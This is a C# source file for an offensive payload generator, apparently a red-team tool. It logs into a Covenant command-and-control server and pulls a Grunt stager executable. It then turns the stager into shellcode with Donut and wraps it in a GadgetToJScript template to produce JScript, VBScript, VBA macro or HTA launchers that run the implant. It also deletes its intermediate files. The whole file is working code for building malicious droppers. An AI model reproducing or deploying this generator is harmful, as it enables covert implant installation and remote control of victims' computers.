using System;
using Covenant;
using System.IO;
using System.Reflection;
using NDesk.Options;

namespace CovToJScript
{
    class Program
    {
        enum EWSH
        {
            js,
            vbs,
            vba,
            hta
        }

        enum ENC
        {
            b64,
            hex
        }

        private static string _CovenantURL;
        private static string _Username;
        private static string _Password;
        private static string _wsh;
        private static string _outputFName;
        private static bool _regFree = false;
        private static string _enc = "b64";
        static void Main(string[] args)
        {
            var show_help = false;

            OptionSet options = new OptionSet(){
                {"c|ConvantURL=","https://127.0.0.1:7443", v =>_CovenantURL=v},
                {"u|Username=","Covenant username", v => _Username=v},
                {"p|Password=","Covenant Password", v =>_Password=v},
                {"w|scriptType=","js, vbs, vba or hta", v =>_wsh=v},
                {"e|encodeType=","VBA gadgets encoding: b64 or hex (default set to b64)", v => _enc=v},
                {"o|output=","Generated payload output file, example: C:\\Users\\userX\\Desktop\\output (Without extension)", v =>_outputFName=v},
                {"r|regfree","registration-free activation of .NET based COM components", v => _regFree = v != null},
                {"h|help=","Show Help", v => show_help = v != null},

            };
            try
            {
                options.Parse(args);

                if (_wsh == null || _outputFName == null || _CovenantURL == null || _Username == null || _Password == null)
                {
                    Console.WriteLine("here");
                    showHelp(options);
                    return;
                }

                if (!Enum.IsDefined(typeof(EWSH), _wsh))
                {
                    showHelp(options);
                    return;
                }

                if (!Enum.IsDefined(typeof(ENC), _enc))
                {
                    showHelp(options);
                    return;
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                Console.WriteLine("Try --help for more information.");
                showHelp(options);
                return;

            }


            File.WriteAllBytes("GruntStager.exe", Convert.FromBase64String(CovenantAPI.DoStuff(_CovenantURL,_Username,_Password)));
            Console.WriteLine("Trying donut shizzle");
            string[] DonutArgs = new string[] { "-f", "GruntStager.exe" };
            Donut.Donut.DonutMain(DonutArgs);
            Console.WriteLine("Generating Payload Template");
            string _wshTemplate = "";
            string shellcode = File.ReadAllText("payload.bin.b64");
            Assembly assembly = Assembly.GetExecutingAssembly();
            using (Stream stream = assembly.GetManifestResourceStream("CovToJScript.GadgetToJScript.templates.payload.template"))
            
            using (StreamReader reader = new StreamReader(stream))
            {
                _wshTemplate = reader.ReadToEnd();
                _wshTemplate = _wshTemplate.Replace("%BASE64%", shellcode);
            }
            File.WriteAllText("payload.txt...", _wshTemplate);
            Console.WriteLine("Payload Template Generated...");
            Console.WriteLine("Generating new launcher...");
            GadgetToJScript.GadgetToJscriptProgram.DoStuff(args);
            Console.WriteLine("Cleaning Up...");
            try
            {
                File.Delete("payload.bin");
                File.Delete("payload.bin.b64");
                File.Delete("payload.txt");
                File.Delete("GruntStager.exe");
            }
            catch { }
            Console.WriteLine("Generation Complete...");

        }
        public static void showHelp(OptionSet p)
        {
            Console.WriteLine("Usage:");
            p.WriteOptionDescriptions(Console.Out);
        }
    }
}
